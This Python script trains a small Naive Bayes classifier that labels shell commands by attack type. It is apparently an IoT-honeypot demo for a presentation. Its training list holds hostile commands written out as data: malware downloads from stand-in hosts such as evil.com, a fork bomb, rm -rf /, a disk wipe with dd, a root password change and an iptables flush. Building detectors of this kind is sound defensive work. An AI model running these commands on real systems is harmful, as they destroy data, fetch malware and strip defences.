import pandas as pd
from sklearn.feature_extraction.text import CountVectorizer
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import make_pipeline

# 1. Prepare a "Mini-Dataset" for the Demo
# In a real world scenario, you would load this from a large CSV.
# Here, we hardcode common IoT attack patterns for the presentation.
training_data = [
    # Reconnaissance (Information Gathering)
    ("cat /proc/cpuinfo", "Reconnaissance"),
    ("uname -a", "Reconnaissance"),
    ("whoami", "Reconnaissance"),
    ("ifconfig", "Reconnaissance"),
    ("cat /etc/passwd", "Reconnaissance"),
    
    # Malware Download (The most common IoT attack)
    ("wget http://bad-site.com/bin", "Malware Download"),
    ("curl -O http://evil.com/bot", "Malware Download"),
    ("tftp -g -r bot.mpsl", "Malware Download"),
    ("rx bot.arm7", "Malware Download"),
    
    # Destructive / Sabotage
    ("rm -rf /", "Destruction"),
    (":(){ :|:& };:", "Destruction"), # Fork bomb
    ("dd if=/dev/zero of=/dev/sda", "Destruction"),
    
    # Persistence / Privilege Escalation
    ("chmod 777 startup.sh", "Persistence"),
    ("echo 'root:pass' | chpasswd", "Privilege Escalation"),
    ("iptables -F", "Defense Evasion")
]

# Separate data into text (X) and labels (y)
df = pd.DataFrame(training_data, columns=['command', 'type'])
X_train = df['command']
y_train = df['type']

# 2. Build the Model Pipeline
# CountVectorizer converts text to a matrix of token counts
# MultinomialNB is excellent for text classification with discrete features
model = make_pipeline(CountVectorizer(), MultinomialNB())

# 3. Train the Model
print("[*] Training ML Attack Classifier...")
model.fit(X_train, y_train)
print("[*] Model Trained Successfully.")

def predict_attack_type(command_text):
    """
    Predicts the type of attack based on the command string.
    """
    if not command_text or len(command_text.strip()) < 2:
        return "Unknown/Noise"
    
    prediction = model.predict([command_text])[0]
    return prediction

# Quick test if run directly
if __name__ == "__main__":
    test_cmd = "wget http://virus.com"
    print(f"Command: {test_cmd} -> Type: {predict_attack_type(test_cmd)}")